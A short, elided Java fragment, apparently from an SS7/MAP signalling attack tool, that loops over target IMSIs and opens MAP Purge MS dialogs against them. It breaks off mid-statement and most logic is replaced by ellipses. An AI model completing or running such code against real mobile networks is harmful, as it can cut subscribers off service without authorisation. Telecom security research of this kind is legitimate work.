...
public class PurgeMS extends PurgeLowLevel {
	...
	while (i < target_imsi.length) {
	    ...
	    IMSI imsi = this.mapProvider.getMAPParameterFactory().createIMSI(target_imsi[i]);
		...
		MAPDialogMobility mapDialogMobility = this.mapProvider.getMAPServiceMobility()
			.createNewDialog(MAPApplicationContext.getInstance(MAPApplicationContextName.msPurgingContext,
